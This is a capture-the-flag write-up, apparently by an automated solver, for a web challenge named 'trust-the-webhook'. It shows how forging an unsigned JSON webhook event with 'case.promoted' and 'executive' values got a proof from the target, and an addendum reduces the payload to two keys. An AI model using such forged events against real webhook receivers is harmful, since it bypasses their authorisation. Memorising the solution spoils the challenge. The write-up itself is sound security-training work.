---
day: 19
slug: "trust-the-webhook"
lane: web-exploitation
modes: [single_solve]
has_solve_py: []
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

I posted to the target’s feature route:

`POST https://6bd65bf6a773674ec179e39d8352fc46f1a559a82c68648d.2026.huntress.ctf.games/dispatch-3940be`

The successful request used only `Content-Type: application/json` and this body:

```json
{
  "event": "case.promoted",
  "type": "case.promoted",
  "event_type": "case.promoted",
  "owner_scope": "executive",
  "scope": "executive",
  "owner": "executive",
  "data": {
    "event": "case.promoted",
    "type": "case.promoted",
    "event_type": "case.promoted",
    "owner_scope": "executive",
    "scope": "executive"
  },
  "payload": {
    "event": "case.promoted",
    "type": "case.promoted",
    "event_type": "case.promoted",
    "owner_scope": "executive",
    "scope": "executive"
  }
}
```

The target responded:

```json
{"ok":true,"effect":"forged_event_consumed","evidence":"proof_2f58250f07c748998854d9f74c05af72"}
```

I got the route and values from the target’s `/api/clues` response: it named `/dispatch-3940be`, event type `case.promoted`, and owner scope `executive`. The homepage also pointed to the notes and described a protected effect. A GET to the feature route returned `post_required`, and an empty POST returned `webhook_rejected`, so I tried sending the clue values as a forged event. A few straightforward field layouts were rejected; the body above, which included common field names both at the top level and nested, was accepted.

One caveat: because I put several aliases and layouts into the successful request at once, I did **not** determine which individual field or nesting was necessary. I can say the target consumed that unsigned JSON request and returned the proof; I can’t claim that this was the minimal payload. I submitted the returned proof under `proof-1`, and the Game Master accepted it.

---

**Addendum (later worker, time_trial/mastery pass):** the minimal payload is
now known. The check is stateless — the same `proof_<hex>` comes back on
every correct repeat — so it was safe to binary-search the kitchen-sink body
directly against a live target. The receiver wants *exactly* two bare keys:

```json
{"event": "<event_type from /api/clues>", "owner": "<owner_scope from /api/clues>"}
```

Neither the clue's own key names (`event_type`/`owner_scope`) nor the
`type`/`scope` aliases work alone — only the literal words `event` and
`owner`, both required, both values matched exactly. No nesting under
`data`/`payload` is needed. See
`solver_py_scripts/day-26-web-exploitation/trust-the-webhook/NOTES.md` for
the full probe matrix and `docs/web-worker-lessons.md` for the general
lesson this produced.
